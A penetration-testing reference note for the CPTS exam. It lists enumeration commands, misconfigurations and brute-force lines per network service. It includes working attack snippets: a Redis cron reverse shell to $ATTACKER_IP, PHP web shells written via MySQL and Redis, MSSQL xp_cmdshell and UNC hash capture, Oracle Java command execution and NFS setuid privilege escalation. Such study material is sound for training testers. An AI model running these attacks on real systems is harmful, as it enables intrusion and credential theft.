# Service Enumeration Compilation — CPTS Exam Reference

> **Methodology:** For every open port, follow this sequence:
> 1. Identify the service (banner + nmap -sV)
> 2. Check for default/anonymous credentials
> 3. Enumerate users/shares/data
> 4. Check for known vulnerabilities
> 5. Check for misconfigurations (writeable shares, null sessions, weak auth)
> 6. Document everything — reuse found credentials/usernames on OTHER services

---

## FTP — Port 21

### Identification
```
Banner: nc -nv $IP 21
Version: nmap -sV -p 21 $IP
Script:  nmap -p 21 --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor $IP
```

### Enumeration Commands
```
# Anonymous login
ftp $IP
  > anonymous
  > ftp@example.com
  > ls -la
  > binary (for binary files)
  > get file.txt
  > passive (toggle PASV mode)

# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie $IP

# Curl
curl ftp://$IP --user anonymous:test -ls
curl ftp://$IP/file.txt --user user:pass -o file.txt

# LFTP for recursive download
lftp -u anonymous,test $IP
  > mirror

# Netcat banner (verbosity needed)
nc -vn $IP 21
```

### What You're Looking For
- **Anonymous login** enabled (classic misconfig)
- **Writeable FTP root** — upload shell, download other user files
- FTP bounce scan — proxy through vulnerable FTP to scan internal hosts
- FTP credentials in web config files (often same password reused)
- `.ftpaccess`, `.ftpquota` files with sensitive info
- vsFTPd 2.3.4 backdoor — smiley face in username triggers shell on port 6200

### Common Misconfigurations
- Anonymous write enabled (upload webshell if FTP root = web root)
- World-readable files containing passwords
- FTP running on non-standard port (2121, 21, 990 FTPS)
- Old vsFTPd version (pre-3.0.0)

### Brute Force
```
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://$IP
medusa -u ftpuser -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt $IP
```

---

## SSH — Port 22

### Identification
```
Banner: nc -nv $IP 22
Version: nmap -sV -p 22 $IP
Scripts: nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey $IP
```

### Enumeration Commands
```
# Check auth methods
nmap -p 22 --script ssh-auth-methods $IP

# Check weak algorithms
nmap -p 22 --script ssh2-enum-algos $IP

# Get host key
ssh-keyscan -t rsa $IP
ssh-keyscan -t ecdsa $IP

# SSH connection test
ssh root@$IP -o StrictHostKeyChecking=no
ssh $IP -o PreferredAuthentications=password -o PubkeyAuthentication=no
```

### What You're Looking For
- **Weak auth methods** (password allowed for root)
- **Weak key exchange algorithms** (diffie-hellman-group1-sha1 = old)
- SSH key fingerprint for host identification
- **Banner version** — old versions have known vulnerabilities
- **SSH key reuse** across hosts

### Common Misconfigurations
- Password authentication enabled for root
- Weak ciphers/algos enabled (RC4, 3DES)
- **Authorized keys file** world-readable in user home (unusual but happens)
- SSH tunneling enabled — pivot point
- libssh authentication bypass (CVE-2018-10933) on <0.8.4

### Brute Force
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P passwords.txt ssh://$IP -t 4
medusa -u root -P passwords.txt -h $IP -M ssh
crackmapexec ssh $IP -u users.txt -p passwords.txt
```

---

## SMTP — Port 25 (also 465, 587)

### Identification
```
Banner: nc -nv $IP 25
Version: nmap -sV -p 25 $IP
Scripts: nmap -p 25 --script smtp-commands,smtp-open-relay,smtp-enum-users $IP
```

### Enumeration Commands
```
# Manual banner grab
nc -nv $IP 25
HELO attacker.com
EHLO attacker.com
VRFY root
VRFY admin
EXPN root
EXPN admin
RCPT TO:root@example.com

# SMTP user enumeration (VRFY)
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods=VRFY $IP

# SMTP open relay check
nmap -p 25 --script smtp-open-relay $IP

# Manual relay check
telnet $IP 25
HELO attacker.com
MAIL FROM:<test@test.com>
RCPT TO:<external@example.com>
DATA
Subject: test
This is a test relay check.
.
QUIT
```

### What You're Looking For
- **Open relay** — can send mail through the server for anyone
- **User enumeration** via VRFY, EXPN, RCPT TO
- SMTP credentials in web apps or config files
- Old Sendmail/Exim with known vulns

### Common Misconfigurations
- Open relay (spam sending)
- VRFY/EXPN enabled (user enumeration)
- Weak auth on submission port (587, 465)
- Old SMTP server version

### Brute Force
```
hydra -l user@domain.com -P passwords.txt smtp://$IP
medusa -u user@domain.com -P passwords.txt -h $IP -M smtp
```

---

## DNS — Port 53

See full reference: [[01 - Information Gathering/1.3 DNS Enumeration/DNS Enumeration]]

```
dig @$IP example.com AXFR              # Zone transfer
dig @$IP example.com NS                # Name servers
dig @$IP example.com ANY               # All records
nmap -p 53 --script dns-zone-transfer,dns-brute $IP
dnsrecon -d example.com -n $IP
```

---

## HTTP/HTTPS — Ports 80, 443, 8080, 8443, 8000, 8888

### Identification
```
Banner: curl -s -I http://$IP | head -20
Version: nmap -sV -p 80,443 $IP
Scripts: nmap -p 80,443 --script http-enum,http-headers,http-server-header $IP
```

### Enumeration Commands
```
# Headers and info
curl -s -I http://$IP
curl -s -k -I https://$IP
curl -s -L http://$IP | head -50

# Directory enumeration
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,asp,aspx,jsp
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50

# Dirb
dirb http://$IP /usr/share/wordlists/dirb/common.txt -w

# Automatic content discovery
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -t 50

# Virtual host discovery
ffuf -u http://$IP -H "Host: FUZZ.example.com" -w vhosts.txt -fs 1234  (filter size)

# WebDav
nmap -p 80 --script http-webdav-scan $IP
davtest -url http://$IP
cadaver http://$IP

# CMS identification
whatweb http://$IP
wpscan --url http://$IP --enumerate u,vp  (WordPress)
droopescan scan drupal -u http://$IP
joomscan -u http://$IP

# Common web vuln checks
nikto -h http://$IP -ssl -Format html -o nikto.html
wafw00f -a http://$IP
```

### What You're Looking For
- **Server header** — Apache, Nginx, IIS, Tomcat (+ version)
- **CMS** — WordPress, Drupal, Joomla, Magento
- **Technology stack** — PHP, ASP.NET, Node.js, Python, Ruby
- **Exposed files** — robots.txt, .git/config, backup files
- **Admin panels** — /admin, /wp-admin, /joomla/administrator
- **Directory listing** enabled
- **File upload** capabilities
- **WebDAV** enabled and accessible

### Common Misconfigurations
- Directory listing enabled
- Default credentials on admin panels
- File upload with no validation
- .git folder exposed
- Backup files (.bak, .old, .swp)
- Information disclosure in headers/errors
- HTTP methods enabled (PUT, DELETE)
- WebDAV with write access

### Brute Force
```
hydra -l admin -P passwords.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

---

## POP3 — Port 110

### Identification
```
Banner: nc -nv $IP 110
Version: nmap -sV -p 110 $IP
```

### Enumeration Commands
```
# Connect and identify
nc -nv $IP 110
USER admin
PASS password
LIST
RETR 1
TOP 1 10                # Show headers + 10 lines of body
QUIT

# With TLS (POP3S port 995)
openssl s_client -connect $IP:995 -crlf -quiet
USER admin
PASS password
LIST
```

### What You're Looking For
- **Weak passwords** that can be brute-forced
- **Emails** containing credentials to other services
- User enumeration through login responses

### Brute Force
```
hydra -L users.txt -P passwords.txt pop3://$IP
hydra -l user@domain.com -P passwords.txt pop3://$IP -s 110
```

---

## SMB — Ports 139, 445

### Identification
```
Banner: nmap -p 445 --script smb-protocols $IP
Version: nmap -sV -p 139,445 $IP
Scripts: nmap -p 445 --script smb-os-discovery,smb-security-mode,samba-vuln-cve-2012-1182 $IP
```

### Enumeration Commands
```
# Null session check
smbclient -L //$IP -N
smbclient //$IP/sharename -N

# SMBmap
smbmap -H $IP
smbmap -H $IP -u guest -p ""

# CrackMapExec
crackmapexec smb $IP
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --shares

# Enum4linux
enum4linux -a $IP
enum4linux -u administrator -p password -a $IP

# RPC client
rpcclient -U "" -N $IP
  > srvinfo
  > enumdomusers
  > enumdomgroups
  > netshareenumall
  > querydominfo
  > getdompwinfo
  > enumprivs
  > lsaenumsid
  > netuserenum 2

# SMBv1 detection
nmap -p 445 --script smb-protocols $IP

# Impacket samrdump (if you have creds)
samrdump.py $IP/admin:password@$IP

# SMB scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-ls $IP
```

### What You're Looking For
- **Null session/guest** access — read shares without credentials
- **Shares with read/write access** — exfiltrate files, upload shell
- **SMB signing disabled** — relay attacks possible
- **SMBv1 enabled** — EternalBlue (MS17-010) possibility
- **Windows/Samba versions** — known vulns
- **Domain users** list — for password spraying
- **IPC$ share** — named pipe access

### Common Misconfigurations
- Null session enabled (Windows legacy)
- Guest account enabled with share access
- SMB signing disabled (NTLM relay)
- SMBv1 enabled (EternalBlue)
- World-writable shares
- Samba <4.x with known vulnerabilities

### Brute Force
```
crackmapexec smb $IP -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P passwords.txt smb://$IP
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt $IP
```

---

## IMAP — Port 143

### Identification
```
Banner: nc -nv $IP 143
Version: nmap -sV -p 143 $IP
```

### Enumeration Commands
```
# Connect
nc -nv $IP 143
. LOGIN user password
. LIST "" "*"
. EXAMINE INBOX
. FETCH 1 BODY[TEXT]
. LOGOUT

# With TLS (IMAPS port 993)
openssl s_client -connect $IP:993 -crlf -quiet
. LOGIN user password
. LIST "" "*"
```

### What You're Looking For
- **Credentials in emails** (service passwords, VPN creds)
- User enumeration
- Weak passwords

### Brute Force
```
hydra -L users.txt -P passwords.txt imap://$IP
medusa -u user -P passwords.txt -h $IP -M imap
```

---

## SNMP — UDP Port 161

### Identification
```
Banner: nmap -sU -p 161 --script snmp-info $IP
Version: snmpget -v1 -c public $IP 1.3.6.1.2.1.1.1.0
```

### Enumeration Commands
```
# SNMPwalk (full MIB tree)
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP .1.3.6.1.2.1  (mib-2 tree)
snmpwalk -v1 -c public $IP

# SNMPwalk specific OIDs
snmpwalk -v1 -c public $IP 1.3.6.1.4.1.77.1.2.25          # Windows users (samba)
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.4.2.1.2         # Running processes
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.1.6.0           # System processes
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.6.3.1.2         # Installed software
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.1.5.0              # Hostname
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.4.34.1.3           # ARP table
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.1.6.0              # Location
snmpwalk -v1 -c public $IP 1.3.6.1.4.1.77.1.2.3.1.1       # Domain users
snmpwalk -v1 -c public $IP 1.3.6.1.4.1.77.1.2.3.1.2       # Domain groups
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.2.2.1.2            # Network interfaces
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.2.3.1.3         # Disk volumes
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.2.3.1.5         # Disk space

# SNMPget (single OID)
snmpget -v2c -c public $IP 1.3.6.1.2.1.1.1.0              # System description
snmpget -v2c -c public $IP 1.3.6.1.2.1.1.3.0              # System uptime

# SNMPbulkwalk (faster than snmpwalk)
snmpset -v2c -c public $IP
snmptable -v2c -c public $IP

# Braa (multi-threaded snmp walk — faster for large OID sets)
braa public@$IP:.1.3.6.1.2.1.25.*

# Nmap scripts
nmap -sU -p 161 --script snmp-info,snmp-processes,snmp-win32-software $IP
```

### What You're Looking For
- **Readable SNMP community** (default: public/private)
- **Windows user lists** — username:rid format
- **Running processes** — AV, monitoring tools, custom apps
- **Network interfaces** — IP addresses on other networks
- **Installed software** — version numbers for vulnerable software
- **System info** — OS version, uptime, hostname

### Common Misconfigurations
- Default community string (public/private)
- MIB tree fully accessible
- SNMP v3 with default/no auth

### Brute Force
```
# onesixtyone — fastest
echo public > community.txt
echo private >> community.txt
echo manager >> community.txt
onesixtyone -c community.txt -i targets.txt

# Nmap brute
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt $IP
```

---

## LDAP — Port 389 (also 636 LDAPS, 3268 Global Catalog)

### Identification
```
Banner: nmap -sV -p 389 $IP
Script:  nmap -p 389 --script ldap-rootdse $IP
```

### Enumeration Commands
```
# Nmap scripts
nmap -p 389 --script ldap-rootdse,ldap-search,ldap-brute $IP

# ldapsearch (anonymous bind)
ldapsearch -x -h $IP -b "dc=example,dc=com"
ldapsearch -x -h $IP -b "dc=example,dc=com" "(objectclass=*)"
ldapsearch -x -h $IP -b "dc=example,dc=com" "(|(samAccountType=805306368)(samAccountType=268435456))"
ldapsearch -x -h $IP -b "dc=example,dc=com" "cn=*admin*" cn sn mail
ldapsearch -x -h $IP -b "dc=example,dc=com" "(mail=*)" mail userPrincipalName
ldapsearch -x -h $IP -b "dc=example,dc=com" "objectclass=user" sAMAccountName
ldapsearch -x -h $IP -b "dc=example,dc=com" "objectclass=group" cn member

# With credentials
ldapsearch -x -h $IP -D "CN=user,CN=Users,DC=example,DC=com" -w 'password' -b "dc=example,dc=com"

# Dump all attributes
ldapsearch -x -h $IP -b "dc=example,dc=com" "*" +

# Global Catalog (port 3268)
ldapsearch -x -h $IP:3268 -b "dc=example,dc=com"

# Windapsearch
python3 windapsearch.py --dc-ip $IP -u "" -U

# LDAPDomainDump
python3 ldapdomaindump.py -u "example.com\\user" -p 'password' $IP
```

### What You're Looking For
- **Anonymous bind enabled** — read entire directory without creds
- **User accounts** — full list for password spraying
- **Service accounts** — often with high privileges
- **Group memberships** — privileged groups (Domain Admins, Enterprise Admins)
- **Computer objects** — list of domain-joined machines
- **Descriptions** fields — users often put passwords in descriptions
- **SPN entries** — for Kerberoasting (service accounts)
- **UserPassword attribute** — clear-text passwords (rare but gold)

### Common Misconfigurations
- Anonymous LDAP bind enabled
- Weak or default LDAP passwords
- Password in "description" attribute
- Unrestricted LDAP queries

---

## RPC — Port 135

### Identification
```
Banner: nmap -sV -p 135 $IP
```

### Enumeration Commands
```
# Nmap scripts
nmap -p 135 --script rpc-grind,rpcinfo $IP

# rpcdump via Impacket
impacket-rpcdump $IP

# rpcdump via Metasploit
msf6 > use auxiliary/scanner/dcerpc/endpoint_mapper
msf6 > set RHOSTS $IP
msf6 > run

# NFS-related RPC services
rpcinfo -p $IP

# Connecting with rpcclient
rpcclient -U "" -N $IP         # Null session (SMB)
rpcclient -U "DOMAIN\\user" $IP
```

### What You're Looking For
- **RPC services list** — identify running services (NFS, SMB, Exchange, SQL)
- **Endpoint mapper** — find where all RPC services are listening
- **Management interfaces** — for further exploitation
- **rpcmap** — check for vulnerable RPC services

---

## Rsync — Port 873

### Identification
```
Banner: nc -nv $IP 873
Version: nmap -sV -p 873 $IP
```

### Enumeration Commands
```
# List shares (modules)
rsync -av --list-only rsync://$IP
rsync -av --list-only rsync://$IP/share

# Download all files from a share
rsync -av rsync://$IP/share/ ./destination/

# Download with auth
rsync -av rsync://user@$IP/share/ ./destination/

# Upload file
rsync -av ./localfile rsync://$IP/share/

# Nmap script
nmap -p 873 --script rsync-list-modules $IP
```

### What You're Looking For
- **Anonymous rsync access** — download/upload files
- **Writeable shares** — upload SSH keys, web shells, scripts
- **Sensitive files** — configs, backups, databases, source code

### Common Misconfigurations
- No authentication required
- Write access allowed to anonymous users
- Sensitive data in rsync shares
- rsync root to web root

---

## MSSQL — Port 1433

### Identification
```
Banner: nmap -sv -p 1433 $IP
Scripts: nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $IP
```

### Enumeration Commands
```
# Nmap scripts
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-brute,ms-sql-xp-cmdshell $IP

# Impacket mssqlclient
impacket-mssqlclient DOMAIN/user:password@$IP
impacket-mssqlclient user@$IP -windows-auth

# Connect with sqsh
sqsh -S $IP -U sa -P password

# SQL queries to run
# Get version
SELECT @@version;

# List databases
SELECT name FROM sys.databases;

# List users
SELECT name, type_desc FROM sys.server_principals;

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# UNC injection (NTLM hash capture)
EXEC xp_dirtree '\\$ATTACKER_IP\share\test';

# If xp_cmdshell not available — use xp_regwrite/read
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName';
```

### What You're Looking For
- **SA account with empty/weak password**
- **xp_cmdshell available** — command execution
- **Linked servers** — pivot points to other databases/machines
- **Database contents** — application credentials
- **UNC paths in queries** — relay NTLM authentication
- **NTLM authentication** when connecting — hash capture possible

### Common Misconfigurations
- SA empty password
- xp_cmdshell enabled
- MSSQL exposed to internet
- Linked servers with trust relationship
- Service account with excessive privileges

### Brute Force
```
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $IP
hydra -l sa -P passwords.txt mssql://$IP
crackmapexec mssql $IP -u sa -p passwords.txt
```

---

## NFS — Port 2049

### Identification
```
Banner: nmap -sV -p 2049 $IP
Scripts: nmap -p 2049 --script nfs-showmount,nfs-ls,nfs-statfs $IP
```

### Enumeration Commands
```
# Show exports
showmount -e $IP
rpcinfo -p $IP | grep nfs

# Mount NFS share
sudo mkdir -p /mnt/nfs
sudo mount -t nfs $IP:/sharename /mnt/nfs -o nolock,vers=3
sudo mount -t nfs -o nolock $IP:/ /mnt/nfs

# Mount with specific options
sudo mount -t nfs $IP:/backups /mnt/nfs -o nolock,vers=4,proto=tcp,port=2049

# Browse mounted share
ls -la /mnt/nfs
find /mnt/nfs -type f -readable 2>/dev/null
find /mnt/nfs -type f -name "*.conf" -o -name "*.txt" -o -name "*.sql" 2>/dev/null

# Unmount
sudo umount /mnt/nfs
```

### What You're Looking For
- **Exported shares with no_root_squash** — write files as root
- **World-readable shares** — access credentials, configs, backups
- **World-writeable shares** — upload SSH keys, web shells
- **Mount points to sensitive directories** — /etc, /home, /var

### Common Misconfigurations
- `no_root_squash` enabled — files created as root UID 0
- `all_squash` mapping to anonymous user (nobody)
- Export to any client (no subnet restriction)
- Sensitive files accessible

### Privilege Escalation via NFS
```
# If no_root_squash is set:
sudo mount -t nfs $IP:/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash   # Setuid root
# On the target, run /path/to/share/bash -p
```

---

## MySQL — Port 3306 (also 3307)

### Identification
```
Banner: nmap -sV -p 3306 $IP
Scripts: nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users $IP
```

### Enumeration Commands
```
# MySQL client
mysql -h $IP -u root -p
mysql -h $IP -u root -p'password'

# No password
mysql -h $IP -u root

# Empty password check
mysql -h $IP -u root --password=''

# Nmap scripts
nmap -p 3306 --script mysql-empty-password,mysql-info,mysql-users,mysql-databases,mysql-variables,mysql-audit $IP

# Post-login enumeration
mysql> SELECT @@version;
mysql> SELECT user, host, authentication_string FROM mysql.user;
mysql> SELECT host, user, password_last_changed FROM mysql.user;
mysql> SHOW DATABASES;
mysql> USE database;
mysql> SHOW TABLES;
mysql> SELECT * FROM users;
mysql> SELECT * FROM wp_users;

# Check for file read
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('/var/www/html/config.php');

# Check for file write
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# Check for mysql UDF (user-defined function) exploit
mysql> SELECT * FROM mysql.func;
```

### What You're Looking For
- **Root with no password**
- **Application database** — user credentials (app logins)
- **WordPress/joomla/drupal tables** — admin hashes
- **File read privileges** — read /etc/shadow, web configs
- **File write privileges** — write web shell

### Common Misconfigurations
- Root with no password or weak password
- MySQL accessible from remote (bind-address 0.0.0.0)
- FILE privilege granted
- Running as root
- Weak passwords on application accounts

### Brute Force
```
hydra -L users.txt -P passwords.txt mysql://$IP
nmap -p 3306 --script mysql-brute $IP
medusa -u root -P passwords.txt -h $IP -M mysql
```

---

## RDP — Port 3389

### Identification
```
Banner: nmap -sV -p 3389 $IP
Scripts: nmap -p 3389 --script rdp-sec-check,rdp-enum-encryption $IP
```

### Enumeration Commands
```
# RDP security check
nmap -p 3389 --script rdp-sec-check $IP

# Connect
xfreerdp /v:$IP /u:administrator /p:password
xfreerdp /v:$IP /u:administrator /p:password /cert:ignore /sec:nla
xfreerdp /v:$IP /u:administrator /p:password /drive:local,/tmp
xfreerdp /v:$IP /u:'' /p:''   # Test with no creds

rdesktop $IP
rdesktop -u administrator $IP
rdesktop -d DOMAIN -u administrator -p password $IP

# RDP screenshot (with creds)
crackmapexec rdp $IP -u administrator -p password --screenshot
```

### What You're Looking For
- **Credentialed access** — GUI access to Windows
- **NLA (Network Level Authentication) enabled/disabled**
- **SSL/TLS support** — older RDP versions
- **Weak encryption** — possible man-in-the-middle
- **Restricted Admin mode** — pass the hash to RDP

### Common Misconfigurations
- RDP exposed directly to internet
- Weak account passwords
- NLA disabled (easier brute force)
- No account lockout policy

### Brute Force
```
crackmapexec rdp $IP -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P passwords.txt rdp://$IP
ncrack -U users.txt -P passwords.txt rdp://$IP
```

---

## WinRM — Ports 5985 (HTTP), 5986 (HTTPS)

### Identification
```
Banner: nmap -sV -p 5985,5986 $IP
Scripts: nmap -p 5985 --script winrm-info $IP
```

### Enumeration Commands
```
# Check if WinRM is available
crackmapexec winrm $IP -u '' -p ''

# Connect with Evil-WinRM
evil-winrm -i $IP -u administrator -p password
evil-winrm -i $IP -u administrator -H Hash

# Invoke-Command (PowerShell)
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('administrator', $password)
Invoke-Command -ComputerName $IP -Credential $cred -ScriptBlock { whoami }

# Session via PowerShell
Enter-PSSession -ComputerName $IP -Credential administrator

# WinRM quick test
Test-WSMan -ComputerName $IP
```

### What You're Looking For
- **Credentialed access** — PowerShell remoting
- **Pass-the-hash** possible with Evil-WinRM (if NTLM auth)
- **Admin access** — full remote shell on Windows

### Brute Force
```
crackmapexec winrm $IP -u users.txt -p passwords.txt --continue-on-success
```

---

## Redis — Port 6379

### Identification
```
Banner: nmap -sV -p 6379 $IP
Scripts: nmap -p 6379 --script redis-info $IP
```

### Enumeration Commands
```
# Connect
redis-cli -h $IP
redis-cli -h $IP -p 6379

# Inside redis-cli
> INFO
> INFO keyspace
> SELECT 0
> KEYS *
> GET keyname
> CONFIG GET *
> CONFIG GET dir
> CONFIG GET dbfilename
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> BGSAVE

# With auth
redis-cli -h $IP -a 'password'

# Nmap scripts
nmap -p 6379 --script redis-brute,redis-info $IP
```

### What You're Looking For
- **No authentication** (default until Redis 6)
- **Accessible to web root** — write webshell via CONFIG SET dir
- **SSH key overwrite** — write your public key to /root/.ssh/authorized_keys
- **Crontab overwrite** — schedule command execution as root
- **Sensitive data** stored in Redis (sessions, caches, tokens)

### Common Misconfigurations
- No password set
- Running as root
- Accessible from remote (not bound to 127.0.0.1)
- Writeable web root accessible

### Redis RCE Methods
```
# Method 1: Web shell
redis-cli -h $IP
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET x "<?php system($_GET['cmd']); ?>"
> SAVE

# Method 2: SSH key overwrite
ssh-keygen -t rsa -C "redis@attack" -f /tmp/rsa
(echo -e '\n\n'; cat /tmp/rsa.pub; echo -e '\n\n') > /tmp/rsa.pub.txt
cat /tmp/rsa.pub.txt | redis-cli -h $IP -x set crackit
redis-cli -h $IP
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SAVE

# Method 3: Cron job
redis-cli -h $IP
> CONFIG SET dir /var/spool/cron/crontabs/
> CONFIG SET dbfilename root
> SET x "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'\n\n"
> SAVE
```

---

## Oracle — Port 1521

### Identification
```
Banner: nmap -sV -p 1521 $IP
Scripts: nmap -p 1521 --script oracle-sid-brute,oracle-tns-version,oracle-brute $IP
```

### Enumeration Commands
```
# SID enumeration
nmap -p 1521 --script oracle-sid-brute --script-args oracle-sid-brute.sids=/usr/share/nmap/nselib/data/oracle-sids $IP

# ODAT (Oracle Database Attack Tool)
odat all -s $IP
odat sidguesser -s $IP
odat passwordguesser -s $IP -d <SID>

# SQL*Plus connection
sqlplus user/password@$IP/SID
sqlplus system/password@$IP/SID

# Check version
sqlplus> SELECT banner FROM v$version;

# List users
sqlplus> SELECT username FROM dba_users;

# Check privileges
sqlplus> SELECT * FROM user_role_privs;
sqlplus> SELECT * FROM dba_sys_privs WHERE grantee = 'USER';

# Java execution (if JAVA_SYSPRIV granted)
sqlplus> CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "pwn" AS
        import java.lang.*;
        import java.io.*;
        public class pwn { public static void exec(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd); }};
sqlplus> BEGIN pwn.exec('powershell -enc <base64>'); END;
/
```

### What You're Looking For
- **SID enumeration** — database instance names
- **Default/weak passwords** — system, sys, dbsnmp
- **Java execution** — command execution via DBMS_JAVA
- **DBA privileges** — full control
- **XML DB credentials** (XDB account)

### Common Misconfigurations
- Default passwords (scott/tiger, system/manager, sys/change_on_install)
- Excessive privileges granted to application accounts
- Oracle XDB exposed
- Listener without password

---

## MongoDB — Port 27017

### Identification
```
Banner: nmap -sV -p 27017 $IP
Scripts: nmap -p 27017 --script mongodb-databases,mongodb-info $IP
```

### Enumeration Commands
```
# Connect
mongosh $IP
mongosh $IP:27017

# In mongo shell
> show dbs
> use admin
> db.getUsers()
> db.runCommand({connectionStatus: 1})
> use database
> db.getCollectionNames()
> db.collection.find().pretty()

# Nmap scripts
nmap -p 27017 --script mongodb-databases,mongodb-info $IP

# Without mongosh
curl http://$IP:27017/
echo '{"ping": 1}' | nc $IP 27017
```

### What You're Looking For
- **No authentication** enabled (default pre-3.0)
- **Admin database** without auth
- **Sensitive data** in collections
- **Default credentials**

### Common Misconfigurations
- No authentication required
- Bound to 0.0.0.0 (internet accessible)
- Default port exposed
- Weak/no passwords

---

## Quick Reference: What to Check First per Service

```
PORT   SERVICE   CRITICAL CHECK
21     FTP       anonymous login
22     SSH       weak auth, password for root
25     SMTP      open relay, VRFY
53     DNS       zone transfer
80     HTTP      directory listing, robots.txt, default pages
110    POP3      weak credentials
135    RPC       endpoint mapper
139    SMB       null session
143    IMAP      weak credentials
161    SNMP      public community string
389    LDAP      anonymous bind
443    HTTPS      same as HTTP + certificate info
445    SMB       null session, EternalBlue
873    RSYNC     anonymous list/mount
1433   MSSQL     SA empty password
1521   ORACLE    SID enumeration, default creds
2049   NFS       showmount, world-readable exports
3306   MYSQL     root empty password
3389   RDP       weak creds, NLA status
5432   PGSQL     weak passwords, default accounts
5900   VNC       no-password auth
5985   WINRM     creds for PowerShell remoting
6379   REDIS     no-auth, webshell write
8080   HTTP-ALT  same as HTTP
8443   HTTPS-ALT same as HTTPS
27017  MONGODB   no auth
```

---

## Related [[wikilinks]]
- [[01 - Information Gathering/Nmap Mastery]]
- [[01 - Information Gathering/1.1 Passive Recon/Passive Reconnaissance]]
- [[01 - Information Gathering/1.2 Active Recon/Active Reconnaissance]]
- [[01 - Information Gathering/1.3 DNS Enumeration/DNS Enumeration]]
